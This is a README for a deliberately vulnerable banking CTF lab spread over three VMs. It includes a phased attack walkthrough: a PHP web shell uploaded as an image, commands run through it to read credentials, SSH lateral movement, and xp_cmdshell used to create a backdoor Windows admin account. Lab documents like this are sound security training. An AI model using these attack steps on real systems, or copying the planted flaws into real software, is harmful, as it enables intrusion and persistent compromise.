# Modern Bank - 3-Tier CTF Lab

A deliberately vulnerable banking application designed for cybersecurity training, penetration testing, and CTF competitions.

## 🎯 Quick Start

```bash
# Clone this repository
git clone <repo-url> threetier
cd threetier

# FRONTEND (Ubuntu LTS - 192.168.1.10)
sudo bash frontend/setup_frontend.sh 192.168.1.100

# BACKEND (Ubuntu Server 24 - 192.168.1.100)
sudo bash backend/setup_backend.sh 192.168.1.10 192.168.1.50

# DATABASE (Windows 10 - 192.168.1.50)
PowerShell -ExecutionPolicy Bypass -File database/setup_database.ps1 -BackendIP 192.168.1.100
```

---

## 📋 Overview

Modern Bank is a fully functional 3-tier banking web application with **intentional security vulnerabilities** designed for realistic penetration testing scenarios. The environment demonstrates modern attack techniques and lateral movement across network segments.

### Architecture

```
┌────────────────────┐      ┌──────────────────┐      ┌──────────────┐
│   FRONTEND TIER    │      │  BACKEND TIER    │      │ DATABASE VM  │
│  (Ubuntu LTS)      │      │ (Ubuntu Server)  │      │  (Windows)   │
│  192.168.1.10      │──→   │ 192.168.1.100    │ ──→  │ 192.168.1.50 │
│                    │      │                  │      │              │
│ Apache2 + PHP      │      │ Node.js Express  │      │ SQL Server   │
│ Web UI (Tailwind)  │      │ CGI Admin API    │      │ Banking Data │
│ Avatar Upload      │      │ Vulnerable API   │      │ Audit Logs   │
└────────────────────┘      └──────────────────┘      └──────────────┘
        ↑                            ↑                        ↑
   ENTRY POINT        LATERAL MOVEMENT          DATABASE ACCESS
   (File Upload)     (Credentials/SSRF)         (SQL Injection)
```

---

## 🔓 Key Vulnerabilities

### Frontend Tier
- ✗ **Insecure File Upload** → PHP Web Shell (RCE)
- ✗ **Exposed .env File** → Backend SSH credentials
- ✗ **Weak Client-side Validation** → Extension bypass
- ✗ **Directory Traversal** → List all uploads
- ✗ **Hardcoded Credentials** → In source code comments

### Backend Tier
- ✗ **SSRF Vulnerability** → `/api/proxy` endpoint
- ✗ **Unauthenticated Admin** → `/cgi-bin/admin.php` (RCE)
- ✗ **Configuration Disclosure** → `/api/config`
- ✗ **Exposed Environment** → .env file readable
- ✗ **Command Injection** → CGI endpoints

### Database Tier
- ✗ **Weak Database Credentials** → `Administrator/ModernBank@2024!Admin`
- ✗ **Overprivileged App User** → `bankapp` has `db_owner`
- ✗ **xp_cmdshell Enabled** → Command execution
- ✗ **Open Firewall** → RDP/MSSQL/SMB from Backend
- ✗ **Exposed Credentials File** → Stored on disk

---

## 📁 Directory Structure

```
threetier/
├── frontend/                       # Ubuntu LTS - Public Web App
│   ├── setup_frontend.sh          # Deployment script
│   └── www/                       # Web application files
│       ├── index.php              # Login page
│       ├── dashboard.php          # User dashboard
│       ├── profile.php            # Profile & avatar upload
│       ├── logout.php             # Session logout
│       ├── config.php             # Configuration (EXPOSED)
│       ├── css/
│       │   └── style.css          # Tailwind + custom styling
│       ├── js/
│       │   └── app.js             # Client-side JS
│       └── uploads/               # Avatar upload dir (writable, vulnerable)
│
├── backend/                        # Ubuntu Server 24 - API Tier
│   ├── setup_backend.sh           # Deployment script
│   ├── api/
│   │   ├── server.js              # Express API (Node.js)
│   │   ├── admin_cgi.php          # CGI admin interface
│   │   ├── package.json           # Dependencies
│   │   ├── .env                   # Environment (EXPOSED)
│   │   └── credentials.txt        # Credentials (EXPOSED)
│   └── uploads/                   # Backend file storage
│
├── database/                       # Windows 10 - Database Tier
│   ├── setup_database.bat         # Batch setup script
│   ├── setup_database.ps1         # PowerShell setup
│   ├── schema.sql                 # Database schema
│   ├── sample_data.sql            # Sample banking data
│   └── firewall_config.ps1        # Firewall rules
│
├── docs/                          # Documentation
│   ├── KILL_CHAIN.md              # Complete attack walkthrough
│   ├── VULNERABILITIES.md         # Detailed vulnerability list
│   ├── ARCHITECTURE.md            # System design & deployment
│   └── README.md                  # This file
│
└── .env.example                   # Environment template
```

---

## 🚀 Demo Credentials

### Web Application
```
Admin Account:
  Username: admin
  Password: admin123

Standard User:
  Username: user
  Password: user123
```

### Backend API
```
Admin Endpoint:
  URL: http://192.168.1.100:8080/cgi-bin/admin.php
  No Authentication Required
  
Example:
  http://192.168.1.100:8080/cgi-bin/admin.php?action=info
  http://192.168.1.100:8080/cgi-bin/admin.php?action=exec&cmd=whoami
```

### Database
```
SQL Server:
  Server: 192.168.1.50\SQLEXPRESS
  Admin: Administrator / ModernBank@2024!Admin
  App User: bankapp / BankApp@2024!Insecure
  Database: ModernBank
```

---

## 📖 Attack Walkthrough

### Phase 1: Initial Access (Frontend RCE)

```bash
# 1. Access login page
curl http://192.168.1.10

# 2. Login with credentials
curl -c cookies.txt -X POST http://192.168.1.10/index.php \
  -d "username=admin&password=admin123"

# 3. Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
mv shell.php shell.jpg

# 4. Upload shell
curl -b cookies.txt \
  -F "avatar=@shell.jpg" \
  http://192.168.1.10/profile.php

# 5. Execute commands
curl "http://192.168.1.10/uploads/1.jpg?cmd=whoami"
curl "http://192.168.1.10/uploads/1.jpg?cmd=cat%20../.env"
```

### Phase 2: Lateral Movement (Frontend → Backend)

```bash
# 1. Get credentials from .env
# From shell: BACKEND_SSH_USER=deploy, BACKEND_SSH_PASS=DeployPass123!Vulnerable

# 2. SSH to Backend
ssh deploy@192.168.1.100
# Password: DeployPass123!Vulnerable

# 3. Read Backend config
cat .env | grep WINDOWS
```

### Phase 3: Backend Exploitation

```bash
# 1. Access admin endpoint
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=info"

# 2. Extract Windows credentials from response

# 3. Scan for MSSQL
nmap -sV -p 1433 192.168.1.50

# 4. Connect to database
sqlcmd -S 192.168.1.50 -U Administrator -P "ModernBank@2024!Admin"
```

### Phase 4: Database Access & Compromise

```sql
-- Connect to database
USE ModernBank;

-- Extract user/account data
SELECT * FROM Users;
SELECT * FROM Accounts;
SELECT * FROM Transactions;

-- Enable command execution
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Create backdoor
EXEC xp_cmdshell 'net user attacker P@ssw0rd123 /add';
EXEC xp_cmdshell 'net localgroup Administrators attacker /add';
```

---

## 📊 Attack Timeline

| Time | Phase | Action | Result |
|------|-------|--------|--------|
| 0s | Phase 1 | Login to frontend | Session established |
| 5s | Phase 1 | Upload PHP shell | Web shell created |
| 10s | Phase 1 | Execute shell | RCE as www-data |
| 15s | Phase 1 | Read .env credentials | Backend credentials obtained |
| 20s | Phase 2 | SSH to backend | Access to Backend VM |
| 25s | Phase 3 | Access /api/config | Windows DB credentials |
| 30s | Phase 3 | Query /cgi-bin/admin.php | Additional confirmation |
| 35s | Phase 4 | MSSQL connection | Database connection established |
| 40s | Phase 4 | Enable xp_cmdshell | Command execution enabled |
| 45s | Phase 4 | Create admin user | System fully compromised |

**Total Time: ~45 seconds from initial access to full system compromise**

---

## 🛠️ Technology Stack

### Frontend
- **Web Server:** Apache2 with PHP-FPM
- **Framework:** Plain PHP (vanilla)
- **Styling:** Bootstrap 5 + Custom CSS
- **Database Client:** PHP MySQLi (mock connections)

### Backend
- **Runtime:** Node.js 20+
- **Framework:** Express.js
- **Authentication:** None (vulnerable)
- **Additional:** PHP CLI for CGI

### Database
- **DBMS:** Microsoft SQL Server Express
- **Schema:** Banking domain (Users, Accounts, Transactions, Audit)
- **Features:** Stored procedures, views, triggers (basic)

---

## 📋 Requirements

### Hardware
- **RAM:** 8GB minimum (2GB per VM)
- **Disk:** 100GB minimum (20GB Frontend, 20GB Backend, 30GB Database)
- **CPU:** 8 cores (2 per VM minimum)

### Software
- **Hypervisor:** VirtualBox, Proxmox, ESXi, or VMware
- **Orchestration:** pfSense or equivalent for network segregation
- **OS Images:**
  - Ubuntu LTS (22.04 or 24.04)
  - Ubuntu Server 24
  - Windows 10 Enterprise

---

## 🔧 Installation Steps

### Step 1: Network Setup (pfSense/Firewall)

```
Create Virtual Network: 192.168.1.0/24
- Gateway: 192.168.1.1
- Frontend IP: 192.168.1.10
- Backend IP: 192.168.1.100
- Database IP: 192.168.1.50

Firewall Rules:
- Frontend ingress: Any → :80, :443, :22
- Backend ingress: Frontend only → :8080, :22
- Database ingress: Backend only → :1433, :445, :3389, :22
```

### Step 2: Deploy Frontend

```bash
# Boot: Ubuntu LTS (ens0: 192.168.1.10/24)

# SSH into machine
ssh ubuntu@192.168.1.10

# Clone repo
git clone <repo> /tmp/threetier
cd /tmp/threetier/frontend

# Deploy
sudo bash setup_frontend.sh 192.168.1.100

# Verify
curl http://192.168.1.10/index.php | grep "Modern Bank"
```

### Step 3: Deploy Backend

```bash
# Boot: Ubuntu Server 24 (eth0: 192.168.1.100/24)

ssh ubuntu@192.168.1.100

# Clone repo
git clone <repo> /tmp/threetier
cd /tmp/threetier/backend

# Deploy
sudo bash setup_backend.sh 192.168.1.10 192.168.1.50

# Verify
curl http://192.168.1.100:8080/api/health
```

### Step 4: Deploy Database

```powershell
# Boot: Windows 10 (IP: 192.168.1.50/24)

# Install SQL Server Express (if needed)
# https://www.microsoft.com/en-us/sql-server/sql-server-editions-express

# Run PowerShell as Administrator
PowerShell -ExecutionPolicy Bypass
cd C:\temp\threetier\database

# Deploy
.\setup_database.ps1 -BackendIP 192.168.1.100

# Verify
sqlcmd -S localhost\SQLEXPRESS -U sa -P "sa_password"
# > SELECT @@version
```

---

## 📚 Documentation

- **[KILL_CHAIN.md](docs/KILL_CHAIN.md)** - Complete attack walkthrough with detailed exploitation steps
- **[VULNERABILITIES.md](docs/VULNERABILITIES.md)** - Technical details of each vulnerability
- **[ARCHITECTURE.md](docs/ARCHITECTURE.md)** - System design, deployment guide, troubleshooting

---

## 🎓 Learning Objectives

After completing this CTF, you will understand:

1. **Web Application Security**
   - File upload validation (client-side vs server-side)
   - Credential management and exposure
   - Directory permissions and web accessibility

2. **Network Security & Lateral Movement**
   - Network segmentation importance
   - SSH credential compromise
   - Firewall rule configuration

3. **API Security**
   - SSRF vulnerabilities and exploitation
   - Unauthenticated endpoints
   - Information disclosure via API responses

4. **Database Security**
   - Credential strength and validation
   - Privilege escalation in databases
   - OS command execution via xp_cmdshell

5. **Penetration Testing Tradecraft**
   - Reconnaissance and information gathering
   - Exploitation chaining
   - Persistence and backdoor installation

---

## 🧹 Cleanup

### Reset All Tiers

```bash
# Frontend
ssh ubuntu@192.168.1.10
sudo bash frontend/setup_frontend.sh 192.168.1.100

# Backend
ssh ubuntu@192.168.1.100
sudo bash backend/setup_backend.sh 192.168.1.10 192.168.1.50

# Database
# Windows: Run setup_database.ps1 again (drops and recreates ModernBank DB)
```

### Delete Virtual Machines

```bash
# VirtualBox
VBoxManage list vms
VBoxManage unregistervm "ModernBank-Frontend" --delete
VBoxManage unregistervm "ModernBank-Backend" --delete
VBoxManage unregistervm "ModernBank-Database" --delete
```

---

## ⚠️ Disclaimer

**This application is INTENTIONALLY VULNERABLE for educational purposes only.**

- Do **NOT** use this code in production
- Do **NOT** expose to untrusted networks
- Do **NOT** use as template for real applications
- Only use in isolated lab environments
- For authorized penetration testing only

This project is licensed under MIT for educational and authorized security testing use only.

---

## 📝 Author Notes

### Design Philosophy

This CTF was designed to be:

1. **Realistic** - Mimics real-world security mistakes
2. **Progressive** - Each tier builds on previous compromise
3. **Guided** - Vulnerabilities are discoverable but require effort
4. **Educational** - Each phase teaches security concepts
5. **Customizable** - Easy to modify difficulty/vulnerabilities

### Variations

You can customize this lab for different difficulty levels:

- **Easy:** All tiers accessible, credentials in multiple places, large hints
- **Medium:** Standard configuration, some hints, basic enumeration needed
- **Hard:** Strict firewall rules, limited enumeration, credential obfuscation
- **Extreme:** AV/EDR simulation, log tampering, blind RCE only

---

## 🤝 Contributing

To contribute improvements:

1. Fork the repository
2. Create feature branch
3. Add educational value
4. Maintain intentional vulnerabilities
5. Document thoroughly
6. Submit PR with explanation

---

## 📞 Support

For questions or issues:

1. **Check Documentation:** Start with KILL_CHAIN.md, VULNERABILITIES.md
2. **Review Deployment:** See ARCHITECTURE.md troubleshooting section
3. **Test Network:** Verify connectivity between tiers
4. **Check Logs:** Review service logs for errors
5. **Reset:** If stuck, reset the specific tier

---

## 📊 Scoring Rubric (Optional)

| Objective | Points | Difficulty |
|-----------|--------|------------|
| Access frontend web app | 50 | Trivial |
| Upload + execute PHP shell | 100 | Easy |
| Extract backend credentials | 50 | Easy |
| SSH access to backend | 100 | Medium |
| Access backend API vulnerable endpoints | 150 | Medium |
| Connect to MSSQL database | 100 | Medium |
| Query banking data (all tables) | 150 | Medium |
| Enable xp_cmdshell | 100 | Medium |
| Create backdoor Windows admin | 200 | Hard |
| Full system compromise with persistence | 300 | Hard |
| **TOTAL** | **~1,300** | **Expert** |

---

## 📜 License

MIT License - Educational & Authorized Testing Use Only

```
Copyright (c) 2024 Modern Bank CTF Lab

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, and/or sublicense the
same, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.

DISCLAIMER: This software is for AUTHORIZED EDUCATIONAL AND PENETRATION 
TESTING PURPOSES ONLY. Unauthorized access to computer systems is illegal.
The authors assume no liability for misuse.
```

---

**Happy Penetration Testing! 🎯**

For detailed attack walkthroughs, see [KILL_CHAIN.md](docs/KILL_CHAIN.md)
